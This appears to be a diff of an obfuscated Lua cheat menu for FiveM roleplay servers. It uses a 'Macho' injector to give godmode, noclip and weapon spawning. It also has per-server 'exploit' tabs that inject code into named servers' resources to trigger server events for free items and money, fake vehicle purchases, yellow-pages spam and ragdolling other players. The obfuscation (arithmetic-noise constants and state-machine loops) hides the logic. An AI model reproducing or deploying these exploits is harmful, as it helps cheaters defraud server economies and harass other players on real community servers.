+        ]]);TriggerEvent("txcl:setPlayerMode","noclip");MachoMenuNotification("TX System","Noclip active! Electricity effect added!");else local v846=0 -0 ;while true do if ((683 -(232 + 451))==v846) then TriggerEvent("txcl:setPlayerMode","none");MachoMenuNotification("TX System","Noclip deactivated!");break;end end end break;end end end MachoMenuCheckbox(v10,"Tx Noclip - Safe",function() v173();end,function() if v16 then v173();end end);MachoMenuText(v10,"TX NOCLIP BIND KEYS");MachoMenuCheckbox(v10,"Enable F2 Key",function() local v427=0 + 0 ;while true do if (v427==(0 + 0)) then v170=true;MachoMenuNotification("TX Bind","F2 key enabled for TX Noclip");v427=565 -(510 + 54) ;end if ((1 -0)==v427) then print("[TX Bind] F2 key enabled for TX Noclip");break;end end end,function() v170=false;MachoMenuNotification("TX Bind","F2 key disabled for TX Noclip");print("[TX Bind] F2 key disabled for TX Noclip");end);MachoMenuCheckbox(v10,"Enable F5 Key",function() local v428=0;while true do if (v428==0) then v171=true;MachoMenuNotification("TX Bind","F5 key enabled for TX Noclip");v428=37 -(13 + 23) ;end if (v428==(1 -0)) then print("[TX Bind] F5 key enabled for TX Noclip");break;end end end,function() v171=false;MachoMenuNotification("TX Bind","F5 key disabled for TX Noclip");print("[TX Bind] F5 key disabled for TX Noclip");end);MachoMenuCheckbox(v10,"Enable F7 Key",function() local v429=0;while true do if (v429==0) then v172=true;MachoMenuNotification("TX Bind","F7 key enabled for TX Noclip");v429=1 -0 ;end if (v429==(1 -0)) then print("[TX Bind] F7 key enabled for TX Noclip");break;end end end,function() v172=false;MachoMenuNotification("TX Bind","F7 key disabled for TX Noclip");print("[TX Bind] F7 key disabled for TX Noclip");end);MachoOnKeyDown(function(v430) local v431=1088 -(830 + 258) ;while true do if ((3 -2)==v431) then if (v172 and (v430==(74 + 44))) then v173();MachoMenuNotification("TX Bind","TX Noclip toggled via F7");print("[TX Bind] TX Noclip toggled via F7");end break;end if (0==v431) then if (v170 and (v430==(97 + 16))) then v173();MachoMenuNotification("TX Bind","TX Noclip toggled via F2");print("[TX Bind] TX Noclip toggled via F2");end if (v171 and (v430==(1557 -(860 + 581)))) then local v847=0;while true do if (v847==(3 -2)) then print("[TX Bind] TX Noclip toggled via F5");break;end if (0==v847) then v173();MachoMenuNotification("TX Bind","TX Noclip toggled via F5");v847=1 + 0 ;end end end v431=242 -(237 + 4) ;end end end);MachoMenuButton(v10,"TX Bind Status",function() local v432="F2: "   .. ((v170 and "ON") or "OFF")   .. " | F5: "   .. ((v171 and "ON") or "OFF")   .. " | F7: "   .. ((v172 and "ON") or "OFF") ;MachoMenuNotification("TX Bind Status",v432);print("[TX Bind] Status: "   .. v432 );end);MachoMenuButton(v10,"Enable All TX Binds",function() v170=true;v171=true;v172=true;MachoMenuNotification("TX Bind","All keys enabled! F2, F5, F7");print("[TX Bind] All keys enabled!");end);MachoMenuButton(v10,"Disable All TX Binds",function() v170=false;v171=false;v172=false;MachoMenuNotification("TX Bind","All keys disabled!");print("[TX Bind] All keys disabled!");end);print("[TX Bind] Individual bind system loaded (F2, F5, F7)");MachoMenuCheckbox(v10,"Tx Godmode - Safe",function() local v433=0 -0 ;while true do if (v433==(2 -1)) then MachoMenuNotification("TX Features","Godmode active!");break;end if (v433==(0 -0)) then v17=true;TriggerEvent("txcl:setPlayerMode","godmode");v433=1 + 0 ;end end end,function() v17=false;TriggerEvent("txcl:setPlayerMode","none");MachoMenuNotification("TX Features","Godmode deactivated!");end);MachoMenuCheckbox(v10,"Tx SuperJump - Safe",function() local v434=0;while true do if (v434==1) then MachoMenuNotification("TX Features","SuperJump active!");break;end if (v434==0) then v18=true;TriggerEvent("txcl:setPlayerMode","superjump");v434=1 + 0 ;end end end,function() local v435=0 -0 ;while true do if (v435==0) then v18=false;TriggerEvent("txcl:setPlayerMode","none");v435=1;end if (v435==(1 + 0)) then MachoMenuNotification("TX Features","SuperJump deactivated!");break;end end end);MachoMenuButton(v10,"TX TP Waypoint - Safe",function() TriggerEvent("txcl:tpToWaypoint");end);MachoMenuButton(v9,"Revive - Safe",function() TriggerEvent("hospital:client:Revive",PlayerPedId());end);MachoMenuButton(v10,"Tx Car Fix - Safe",function() TriggerEvent("txcl:vehicle:fix");end);MachoMenuButton(v10,"Tx Wild Attack - Risky",function() TriggerEvent("txcl:wildAttack");end);MachoMenuButton(v10,"Tx Car Boost - Risky",function() TriggerEvent("txcl:vehicle:boost");end);MachoMenuText(v9,"Weapon Spawn");MachoMenuButton(v9,"RPG Spawn - Risky",function() GiveWeaponToPed(PlayerPedId(),"weapon_rpg",136 + 114 ,false,true);end);MachoMenuButton(v9,"Pistol Spawn - Safe",function() GiveWeaponToPed(PlayerPedId(),"weapon_pistol",1676 -(85 + 1341) ,false,true);end);MachoMenuButton(v9,"Glock 19 Spawn - Safe",function() GiveWeaponToPed(PlayerPedId(),"weapon_g19",426 -176 ,false,true);end);MachoMenuButton(v9,"Remove Current Weapon",function() RemoveWeaponFromPed(PlayerPedId(),GetSelectedPedWeapon(PlayerPedId()));end);Citizen.CreateThread(function() local v436=GetConvar("sv_hostname","N/A");local v437=GetConvar("sv_endpoint","N/A");if (v436=="N/A") then v436=GetCurrentServerEndpoint() or "Unknown Server" ;end if (KeysBin=="wex") then local v587=MachoMenuAddTab(v4,"Wex Roleplay");local v588=MachoMenuGroup(v587,"Wex Roleplay",v3,0,(v1.x-v3) + (423 -273) ,v1.y);local v589=MachoMenuInputbox(v588,"Item to Spawn","...");MachoMenuButton(v588,"Spawn Item",function() local v723=0;local v724;while true do if (v723==(372 -(45 + 327))) then v724={item=MachoMenuGetInputbox(v589),amount=1 -0 };if (v724.item and (v724.item~="")) then MachoInjectResource("m-Tequila",string.format([[
                     TriggerServerEvent('m-Tequila:server:CraftAlcoholic', "%s", %d)
-                ]], LocatedText.item, LocatedText.amount))
-            else
-                MachoMenuNotification("Error", "Please enter a valid item name!")
-            end
-        end)
-    end
-
-    -- Edge Roleplay server operations
-    if serverName:find("Edge Roleplay") or serverName:find("edge") then
-        local EdgeTab = MachoMenuAddTab(MenuWindow, "Edge Roleplay")
-        local JobExploitGroup = MachoMenuGroup(EdgeTab, "Item Exploit", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, 300)
-
-        -- Item name input box
-        local InputBoxHandle = MachoMenuInputbox(JobExploitGroup, "Item Code", "e.g., weapon_g19")
-        -- Amount input box
-        local AmountBoxHandle = MachoMenuInputbox(JobExploitGroup, "Amount", "e.g., 1")
-
-        MachoMenuButton(JobExploitGroup, "Give Item", function()
-            local item = MachoMenuGetInputbox(InputBoxHandle)
-            local amount = tonumber(MachoMenuGetInputbox(AmountBoxHandle))
-
-            if item and item ~= "" and amount and amount > 0 then
-                -- Give item to server
-                MachoInjectResource('monitor', string.format([[
+                ]],v724.item,v724.amount));else MachoMenuNotification("Error","Please enter a valid item name!");end break;end end end);end if (v436:find("Edge Roleplay") or v436:find("edge")) then local v590=502 -(444 + 58) ;local v591;local v592;local v593;local v594;while true do if (v590==(0 + 0)) then v591=MachoMenuAddTab(v4,"Edge Roleplay");v592=MachoMenuGroup(v591,"Item Exploit",v3,9,(v1.x-v3) + 150 ,52 + 248 );v590=1;end if (v590==(1 + 0)) then v593=MachoMenuInputbox(v592,"Item Code","e.g., weapon_g19");v594=MachoMenuInputbox(v592,"Amount","e.g., 1");v590=5 -3 ;end if (v590==(1734 -(64 + 1668))) then MachoMenuButton(v592,"Give Item",function() local v885=1973 -(1227 + 746) ;local v886;local v887;while true do if (v885==(0 -0)) then v886=MachoMenuGetInputbox(v593);v887=tonumber(MachoMenuGetInputbox(v594));v885=1;end if (v885==1) then if (v886 and (v886~="") and v887 and (v887>(0 -0))) then MachoInjectResource("monitor",string.format([[
                     TriggerServerEvent('horizon_paymentsystem:giveItem', "%s", %d)
-                ]], item, amount))
-            else
-                MachoMenuNotification("Error", "Please enter a valid item code and amount!")
-            end
-        end)
-    end
-
-    -- Boz RP Exploit menu integration
-    if serverName:find("Boz RP") then
-        local ExploitTab = MachoMenuAddTab(MenuWindow, "Boz RP Exploit")
-        local ExploitSection = MachoMenuGroup(ExploitTab, "Boz RP Money Glitch", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
-        -- Exploit status variable
-        local exploitRunning = false
-        local shouldStop = false
-
-        -- Money exploit start/stop button
-        MachoMenuButton(ExploitSection, "Start/Stop Money Exploit", function()
-            exploitRunning = not exploitRunning
-            if exploitRunning then
-                shouldStop = false
-                MachoInjectResource('monitor', [[
+                ]],v886,v887));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end end end);break;end end end if v436:find("Boz RP") then local v595=494 -(415 + 79) ;local v596;local v597;local v598;local v599;while true do if (v595==(1 + 1)) then MachoMenuButton(v597,"Start/Stop Money Exploit",function() local v888=491 -(142 + 349) ;while true do if (v888==(0 + 0)) then v598= not v598;if v598 then local v964=0;while true do if (v964==(0 -0)) then v599=false;MachoInjectResource("monitor",[[
                     Citizen.CreateThread(function()
                         while true do
                             if shouldStop then
@@ -7476,133 +3460,22 @@ Citizen.CreateThread(function()
                             Citizen.Wait(20)
                         end
                     end)
-                ]])
-            else
-                shouldStop = true
-                MachoInjectResource('monitor', [[
+                ]]);break;end end else local v965=0 + 0 ;while true do if (v965==0) then v599=true;MachoInjectResource("monitor",[[
                     shouldStop = true
                     TriggerEvent('chat:addMessage', { args = { '^2Exploit System:', 'Money exploit stopped!' } })
-                ]])
-            end
-        end)
-    end
-
-    -- Quasar Roleplay server operations
-    if serverName:find("Quasar Roleplay") then
-        local ItemExploitTab = MachoMenuAddTab(MenuWindow, "Quasar Roleplay")
-        local ItemExploitSection = MachoMenuGroup(ItemExploitTab, "Quasar Roleplay", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
-        -- Item name input box
-        local ItemInputBoxHandle = MachoMenuInputbox(ItemExploitSection, "Item Name", "...")
-        -- Amount input box
-        local AmountInputBoxHandle = MachoMenuInputbox(ItemExploitSection, "Amount", "1")
-
-        MachoMenuButton(ItemExploitSection, "Add Item", function()
-            local ItemData = { 
-                item = MachoMenuGetInputbox(ItemInputBoxHandle), 
-                amount = tonumber(MachoMenuGetInputbox(AmountInputBoxHandle)) or 1 
-            }
-
-            if ItemData.item and ItemData.item ~= "" and ItemData.amount > 0 then
-                -- Add item to server
-                MachoInjectResource('any', string.format([[
+                ]]);break;end end end break;end end end);break;end if (v595==(1 + 0)) then v598=false;v599=false;v595=5 -3 ;end if (v595==(1864 -(1710 + 154))) then v596=MachoMenuAddTab(v4,"Boz RP Exploit");v597=MachoMenuGroup(v596,"Boz RP Money Glitch",v3,318 -(200 + 118) ,(v1.x-v3) + 150 ,v1.y);v595=1 + 0 ;end end end if v436:find("Quasar Roleplay") then local v600=0 -0 ;local v601;local v602;local v603;local v604;while true do if (v600==1) then v603=MachoMenuInputbox(v602,"Item Name","...");v604=MachoMenuInputbox(v602,"Amount","1");v600=2 -0 ;end if (0==v600) then v601=MachoMenuAddTab(v4,"Quasar Roleplay");v602=MachoMenuGroup(v601,"Quasar Roleplay",v3,0 + 0 ,(v1.x-v3) + 149 + 1 ,v1.y);v600=1;end if ((2 + 0)==v600) then MachoMenuButton(v602,"Add Item",function() local v889={item=MachoMenuGetInputbox(v603),amount=tonumber(MachoMenuGetInputbox(v604)) or (1 + 0) };if (v889.item and (v889.item~="") and (v889.amount>(0 -0))) then MachoInjectResource("any",string.format([[
                     TriggerServerEvent('sedat:Server:AddItem', "%s", %d)
-                ]], ItemData.item, ItemData.amount, ItemData.item, ItemData.amount))
-            else
-                MachoMenuNotification("Error", "Please enter a valid item name and amount!")
-            end
-        end)
-    end
-
-    -- Valoria Roleplay server operations
-    if serverName:find("Valoria Roleplay") then
-        local RefundMenuTab = MachoMenuAddTab(MenuWindow, "Valoria Roleplay")
-        local ValoriaSection = MachoMenuGroup(RefundMenuTab, "Valoria Roleplay", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
-        -- 1. MONEY REFUND
-        MachoMenuText(ValoriaSection, "Money Exploit")
-        local PaymentTypeInputBoxHandle = MachoMenuInputbox(ValoriaSection, "Payment Type", "Only Cash or Bank")
-        local RefundAmountInputBoxHandle = MachoMenuInputbox(ValoriaSection, "Money Amount", "e.g., 10000")
-
-        MachoMenuButton(ValoriaSection, "Spawn Money", function()
-            local RefundData = {
-                paymentType = MachoMenuGetInputbox(PaymentTypeInputBoxHandle),
-                refund = tonumber(MachoMenuGetInputbox(RefundAmountInputBoxHandle)) or 11111,
-                playerId = GetPlayerServerId(PlayerId())
-            }
-
-            if RefundData.paymentType and RefundData.paymentType ~= "" and RefundData.refund > 0 then
-                MachoInjectResource('monitor', string.format([[ 
-                    TriggerServerEvent('CL-PoliceGarageV2:RefundRent', '%s', %d, %d, 'policejob') 
-                ]], RefundData.paymentType, RefundData.refund, RefundData.playerId))
-            else
-                MachoMenuNotification("Error", "Please enter a valid payment type and amount!")
-            end
-        end)
-
-        -- 2. VEHICLE DATA EXPLOIT
-        MachoMenuText(ValoriaSection, "Vehicle Data Exploit")
-        local InputBoxVehicleName = MachoMenuInputbox(ValoriaSection, "Vehicle Name", "e.g., sultan")
-
-        MachoMenuButton(ValoriaSection, "Send Vehicle", function()
-            local vehicleName = MachoMenuGetInputbox(InputBoxVehicleName)
-
-            if vehicleName ~= "" then
-                MachoInjectResource('CL-PoliceGarageV2', string.format([[ 
+                ]],v889.item,v889.amount,v889.item,v889.amount));else MachoMenuNotification("Error","Please enter a valid item name and amount!");end end);break;end end end if v436:find("Valoria Roleplay") then local v605=1250 -(363 + 887) ;local v606;local v607;local v608;local v609;local v610;local v611;local v612;while true do if (v605==2) then MachoMenuButton(v607,"Send Vehicle",function() local v890=0 -0 ;local v891;while true do if (v890==0) then v891=MachoMenuGetInputbox(v610);if (v891~="") then MachoInjectResource("CL-PoliceGarageV2",string.format([[ 
                     local QBCore = exports['monitor']:GetCoreObject() 
                     local veh = GetVehiclePedIsIn(PlayerPedId(), false) 
                     TriggerServerEvent("CL-PoliceGarageV2:AddData", "vehiclepurchased", "%s", QBCore.Functions.GetVehicleProperties(veh), "police") 
-                ]], vehicleName, vehicleName))
-            else
-                MachoMenuNotification("Error", "Vehicle name cannot be empty!")
-            end
-        end)
-
-        -- 3. ITEM GIVING (JIM)
-        MachoMenuText(ValoriaSection, "Item Exploit")
-        local InputBoxItemCode = MachoMenuInputbox(ValoriaSection, "Item Code", "e.g., sandwich")
-        local InputBoxItemAmount = MachoMenuInputbox(ValoriaSection, "Amount", "e.g., 3")
-
-        MachoMenuButton(ValoriaSection, "Give Item", function()
-            local item = MachoMenuGetInputbox(InputBoxItemCode)
-            local amount = tonumber(MachoMenuGetInputbox(InputBoxItemAmount)) or 1
-
-            if item ~= "" and amount > 0 then
-                MachoInjectResource('drones', string.format([[
+                ]],v891,v891));else MachoMenuNotification("Error","Vehicle name cannot be empty!");end break;end end end);MachoMenuText(v607,"Item Exploit");v611=MachoMenuInputbox(v607,"Item Code","e.g., sandwich");v612=MachoMenuInputbox(v607,"Amount","e.g., 3");v605=3;end if (v605==(0 -0)) then v606=MachoMenuAddTab(v4,"Valoria Roleplay");v607=MachoMenuGroup(v606,"Valoria Roleplay",v3,0 + 0 ,(v1.x-v3) + 150 ,v1.y);MachoMenuText(v607,"Money Exploit");v608=MachoMenuInputbox(v607,"Payment Type","Only Cash or Bank");v605=2 -1 ;end if (v605==(3 + 0)) then MachoMenuButton(v607,"Give Item",function() local v892=1664 -(674 + 990) ;local v893;local v894;while true do if (v892==(1 + 0)) then if ((v893~="") and (v894>(0 + 0))) then MachoInjectResource("drones",string.format([[
                     TriggerServerEvent("Drones:Back", -1, "%s", %d)
-                ]], item, amount, item, amount))
-            else
-                MachoMenuNotification("Error", "Please enter a valid item code and amount!")
-            end
-        end)
-    end
-
-    -- AriaV / Lena Roleplay
-    if serverName:find("AriaV") then
-        local LenaRoleplayTab = MachoMenuAddTab(MenuWindow, "AriaV")
-        local LenaRoleplaySection = MachoMenuGroup(LenaRoleplayTab, "AriaV", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
-        -- Inputs: Item Name and Amount
-        local KodInputHandle = MachoMenuInputbox(LenaRoleplaySection, "Code Name", "Example: item_code")
-        local KodMiktarInputHandle = MachoMenuInputbox(LenaRoleplaySection, "Code Amount", "Example: 3")
-
-        -- Button: Item Exploit
-        MachoMenuButton(LenaRoleplaySection, "Item Exploit", function()
-            local itemKod = MachoMenuGetInputbox(KodInputHandle)
-            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
-
-            if not itemKod or itemKod == "" then
-                MachoMenuNotification("Error", "Please enter a code name!")
-                return
-            end
-
-            if not miktar or miktar <= 0 then
-                MachoMenuNotification("Error", "Please enter a valid amount!")
-                return
-            end
-
-            -- Inject with random item selection
-            MachoInjectResource("ox_inventory", string.format([[
+                ]],v893,v894,v893,v894));else MachoMenuNotification("Error","Please enter a valid item code and amount!");end break;end if (v892==(0 -0)) then v893=MachoMenuGetInputbox(v611);v894=tonumber(MachoMenuGetInputbox(v612)) or (1056 -(507 + 548)) ;v892=838 -(289 + 548) ;end end end);break;end if (v605==(1819 -(821 + 997))) then v609=MachoMenuInputbox(v607,"Money Amount","e.g., 10000");MachoMenuButton(v607,"Spawn Money",function() local v895=255 -(195 + 60) ;local v896;while true do if ((0 + 0)==v895) then v896={paymentType=MachoMenuGetInputbox(v608),refund=tonumber(MachoMenuGetInputbox(v609)) or (12612 -(251 + 1250)) ,playerId=GetPlayerServerId(PlayerId())};if (v896.paymentType and (v896.paymentType~="") and (v896.refund>(0 -0))) then MachoInjectResource("monitor",string.format([[ 
+                    TriggerServerEvent('CL-PoliceGarageV2:RefundRent', '%s', %d, %d, 'policejob') 
+                ]],v896.paymentType,v896.refund,v896.playerId));else MachoMenuNotification("Error","Please enter a valid payment type and amount!");end break;end end end);MachoMenuText(v607,"Vehicle Data Exploit");v610=MachoMenuInputbox(v607,"Vehicle Name","e.g., sultan");v605=2 + 0 ;end end end if v436:find("AriaV") then local v613=1032 -(809 + 223) ;local v614;local v615;local v616;local v617;local v618;while true do if (v613==(3 -0)) then MachoMenuButton(v615,"Ragdoll Player",function() local v897=0 -0 ;local v898;while true do if (v897==(0 -0)) then v898=tonumber(MachoMenuGetInputbox(v618));if (v898 and (v898>(0 + 0))) then MachoInjectResource("monitor",string.format([[ 
+                    TriggerServerEvent("tackle:server:TacklePlayer", %d) 
+                ]],v898));MachoMenuNotification("Lena Roleplay","Ragdoll sent! Target ID: "   .. v898 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);break;end if ((2 + 0)==v613) then MachoMenuButton(v615,"Item Exploit",function() local v899=0;local v900;local v901;while true do if (v899==0) then v900=MachoMenuGetInputbox(v616);v901=tonumber(MachoMenuGetInputbox(v617));v899=618 -(14 + 603) ;end if (1==v899) then if ( not v900 or (v900=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v901 or (v901<=(129 -(118 + 11)))) then MachoMenuNotification("Error","Please enter a valid amount!");return;end v899=2;end if (v899==2) then MachoInjectResource("ox_inventory",string.format([[
                 local itemismi = "%s"
                 local miktar = %d
 
@@ -7644,38 +3517,7 @@ Citizen.CreateThread(function()
                             
                 -- Send only specified amount to server
                 TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
-            ]], itemKod, miktar))
-            MachoMenuNotification("Success", "Item exploit sent!")
-        end)
-
-        -- Player ID text input (Tackle)
-        local TackleTargetIdInputBoxHandle = MachoMenuInputbox(LenaRoleplaySection, "Target Player ID", "Example: 123")
-
-        -- Tackle Button (with MachoInjectResource)
-        MachoMenuButton(LenaRoleplaySection, "Ragdoll Player", function()
-            local targetId = tonumber(MachoMenuGetInputbox(TackleTargetIdInputBoxHandle))
-            if targetId and targetId > 0 then
-                MachoInjectResource('monitor', string.format([[ 
-                    TriggerServerEvent("tackle:server:TacklePlayer", %d) 
-                ]], targetId))
-                MachoMenuNotification("Lena Roleplay", "Ragdoll sent! Target ID: " .. targetId)
-            else
-                MachoMenuNotification("Error", "Please enter a valid player ID!")
-            end
-        end)
-    end
-
-    -- Rena Roleplay
-    if serverName:find("Rena Roleplay") then
-        local RenaMenuTab = MachoMenuAddTab(MenuWindow, "Rena Roleplay")
-        local RenaSection = MachoMenuGroup(RenaMenuTab, "Rena Roleplay", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, 150)
-
-        MachoMenuText(RenaSection, "Money Exploit")
-
-        local DropDownHandle = MachoMenuDropDown(RenaSection, "Drop Down", 
-            function(Index)
-                if Index == 0 then
-                    MachoInjectResource('monitor', [[
+            ]],v900,v901));MachoMenuNotification("Success","Item exploit sent!");break;end end end);v618=MachoMenuInputbox(v615,"Target Player ID","Example: 123");v613=1 + 2 ;end if (v613==(1 + 0)) then v616=MachoMenuInputbox(v615,"Code Name","Example: item_code");v617=MachoMenuInputbox(v615,"Code Amount","Example: 3");v613=5 -3 ;end if (v613==(949 -(551 + 398))) then v614=MachoMenuAddTab(v4,"AriaV");v615=MachoMenuGroup(v614,"AriaV",v3,0,(v1.x-v3) + 150 ,v1.y);v613=1 + 0 ;end end end if v436:find("Rena Roleplay") then local v619=0 + 0 ;local v620;local v621;local v622;while true do if (v619==(1 + 0)) then MachoMenuText(v621,"Money Exploit");v622=MachoMenuDropDown(v621,"Drop Down",function(v902) if (v902==0) then MachoInjectResource("monitor",[[
                         local data = {
                             probability = { b = 540, a = 380 },
                             type = "weapon",
@@ -7685,48 +3527,11 @@ Citizen.CreateThread(function()
                         }
 
                         TriggerServerEvent('luckywheel:give', data)
-                    ]])
-                elseif Index == 2 then
-                    MachoInjectResource('monitor', [[
+                    ]]);elseif (v902==(7 -5)) then MachoInjectResource("monitor",[[
                         TriggerServerEvent('qb-trashsearch:server:searchedTrash', 889090, false, "weapon_bottle")
-                    ]])
-                elseif Index == 4 then
-                    -- No specific action defined for this option
-                else
-                    MachoMenuNotification("Error", "This option not found!")
-                end
-            end, 
-            "G17",
-            "Bottle",
-            "Toast"
-        )
-    end
-
-    -- Atlantis Roleplay
-    if serverName:find("Atlantis Roleplay") then
-        local TradeTab = MachoMenuAddTab(MenuWindow, "Atlantis Roleplay")
-        local TradeSection = MachoMenuGroup(TradeTab, "Atlantis Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-    
-        -- Item Exploit
-        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
-        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
-    
-        MachoMenuButton(TradeSection, "Item Exploit", function()
-            local itemKod = MachoMenuGetInputbox(KodInputHandle)
-            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
-    
-            if not itemKod or itemKod == "" then
-                MachoMenuNotification("Error", "Please enter a code name!")
-                return
-            end
-    
-            if not miktar or miktar <= 0 then
-                MachoMenuNotification("Error", "Please enter a valid amount!")
-                return
-            end
-    
-            -- Random item selection from ox_inventory and data structure
-            MachoInjectResource("ox_inventory", string.format([[
+                    ]]);elseif (v902==(9 -5)) then else MachoMenuNotification("Error","This option not found!");end end,"G17","Bottle","Toast");break;end if (v619==(0 + 0)) then v620=MachoMenuAddTab(v4,"Rena Roleplay");v621=MachoMenuGroup(v620,"Rena Roleplay",v3,0 -0 ,(v1.x-v3) + 42 + 108 ,150);v619=1;end end end if v436:find("Atlantis Roleplay") then local v623=89 -(40 + 49) ;local v624;local v625;local v626;local v627;local v628;local v629;local v630;while true do if (v623==0) then v624=MachoMenuAddTab(v4,"Atlantis Roleplay");v625=MachoMenuGroup(v624,"Atlantis Roleplay Item",v3,9,(v1.x-v3) + 150 ,v1.y);v623=3 -2 ;end if (3==v623) then v629=MachoMenuInputbox(v625,"Phone Number","Example: 123-456-7890");v630=MachoMenuInputbox(v625,"Message","Text to appear in yellow pages");v623=494 -(99 + 391) ;end if (v623==(1 + 0)) then v626=MachoMenuInputbox(v625,"Code Name","Example: item_code");v627=MachoMenuInputbox(v625,"Code Amount","Example: 3");v623=2;end if (v623==(17 -13)) then MachoMenuButton(v625,"Send to Yellow Pages",function() local v903=0 -0 ;local v904;local v905;local v906;while true do if (v903==(3 + 0)) then MachoInjectResource("gksphone",string.format([[
+                TriggerServerEvent('gksphone:yellow_postPagess', "%s", "%s", "%s", "", "bartender")
+            ]],v904,v905,v906));MachoMenuNotification("Success","Sent to yellow pages!");break;end if (v903==(5 -3)) then if ( not v905 or (v905=="")) then local v966=1604 -(1032 + 572) ;while true do if (v966==0) then MachoMenuNotification("Error","Please enter a phone number!");return;end end end if ( not v906 or (v906=="")) then local v967=0;while true do if (0==v967) then MachoMenuNotification("Error","Please enter a message!");return;end end end v903=420 -(203 + 214) ;end if (v903==1) then v906=MachoMenuGetInputbox(v630);if ( not v904 or (v904=="")) then MachoMenuNotification("Error","Please enter a name!");return;end v903=1819 -(568 + 1249) ;end if (0==v903) then v904=MachoMenuGetInputbox(v628);v905=MachoMenuGetInputbox(v629);v903=1 + 0 ;end end end);break;end if ((4 -2)==v623) then MachoMenuButton(v625,"Item Exploit",function() local v907=0;local v908;local v909;while true do if (v907==(0 -0)) then v908=MachoMenuGetInputbox(v626);v909=tonumber(MachoMenuGetInputbox(v627));v907=1;end if (2==v907) then MachoInjectResource("ox_inventory",string.format([[
                 local itemismi = "%s"
                 local miktar = %d
 
@@ -7773,58 +3578,7 @@ Citizen.CreateThread(function()
                             
                 -- Send only specified amount to server
                 TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
-            ]], itemKod, miktar))
-        end)
-
-        -- Yellow Pages Inputs
-        local NameInputHandle = MachoMenuInputbox(TradeSection, "Name", "Name to appear in yellow pages")
-        local PhoneInputHandle = MachoMenuInputbox(TradeSection, "Phone Number", "Example: 123-456-7890")
-        local MessageInputHandle = MachoMenuInputbox(TradeSection, "Message", "Text to appear in yellow pages")
-        
-        -- Yellow Pages Button
-        MachoMenuButton(TradeSection, "Send to Yellow Pages", function()
-            local name = MachoMenuGetInputbox(NameInputHandle)
-            local phone = MachoMenuGetInputbox(PhoneInputHandle)
-            local message = MachoMenuGetInputbox(MessageInputHandle)
-        
-            if not name or name == "" then
-                MachoMenuNotification("Error", "Please enter a name!")
-                return
-            end
-        
-            if not phone or phone == "" then
-                MachoMenuNotification("Error", "Please enter a phone number!")
-                return
-            end
-        
-            if not message or message == "" then
-                MachoMenuNotification("Error", "Please enter a message!")
-                return
-            end
-        
-            -- Yellow Pages Post with MachoInjectResource
-            MachoInjectResource("gksphone", string.format([[
-                TriggerServerEvent('gksphone:yellow_postPagess', "%s", "%s", "%s", "", "bartender")
-            ]], name, phone, message))
-            
-            MachoMenuNotification("Success", "Sent to yellow pages!")
-        end)
-    end
-
-    -- XX Gun
-    if serverName:find("XX Gun") then
-        local TradeTab = MachoMenuAddTab(MenuWindow, "XX Gun")
-        local TradeSection = MachoMenuGroup(TradeTab, "XX Gun Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
-        local InputBoxItemCode = MachoMenuInputbox(TradeSection, "Item Code", "e.g., sandwich")
-        local InputBoxItemAmount = MachoMenuInputbox(TradeSection, "Amount", "e.g., 3")
-
-        MachoMenuButton(TradeSection, "Give Item", function()
-            local item = MachoMenuGetInputbox(InputBoxItemCode)
-            local amount = tonumber(MachoMenuGetInputbox(InputBoxItemAmount)) or 1
-
-            if item ~= "" and amount > 0 then
-                MachoInjectResource('any', string.format([[
+            ]],v908,v909));break;end if (v907==(1307 -(913 + 393))) then if ( not v908 or (v908=="")) then MachoMenuNotification("Error","Please enter a code name!");return;end if ( not v909 or (v909<=(0 -0))) then local v968=0 -0 ;while true do if (0==v968) then MachoMenuNotification("Error","Please enter a valid amount!");return;end end end v907=2;end end end);v628=MachoMenuInputbox(v625,"Name","Name to appear in yellow pages");v623=3;end end end if v436:find("XX Gun") then local v631=MachoMenuAddTab(v4,"XX Gun");local v632=MachoMenuGroup(v631,"XX Gun Item",v3,419 -(269 + 141) ,(v1.x-v3) + (333 -183) ,v1.y);local v633=MachoMenuInputbox(v632,"Item Code","e.g., sandwich");local v634=MachoMenuInputbox(v632,"Amount","e.g., 3");MachoMenuButton(v632,"Give Item",function() local v725=0;local v726;local v727;while true do if ((1982 -(362 + 1619))==v725) then if ((v726~="") and (v727>(1625 -(950 + 675)))) then MachoInjectResource("any",string.format([[
                     local core = exports['monitor']:GetCoreObject()
                     local item = { name = "%s" }
                     local amount = %d
@@ -7832,94 +3586,11 @@ Citizen.CreateThread(function()
                     for i = amount, 1, -1 do
                         TriggerServerEvent('Drones:Back', item, core.Key)
                     end
-                ]], item, amount))
-            else
-                MachoMenuNotification("Error", "Please enter a valid item code and amount!")
-            end
-        end)
-    end
-
-    -- Owl Roleplay
-    if serverName:find("Owl Roleplay") then
-        local TradeTab = MachoMenuAddTab(MenuWindow, "Owl Roleplay")
-        local TradeSection = MachoMenuGroup(TradeTab, "Owl Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-    
-        -- Inputs: Item Name and Amount
-        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
-        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
-    
-        -- Button: Start Process
-        MachoMenuButton(TradeSection, "Item Exploit", function()
-            local itemKod = MachoMenuGetInputbox(KodInputHandle)
-            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
-    
-            if not itemKod or itemKod == "" then
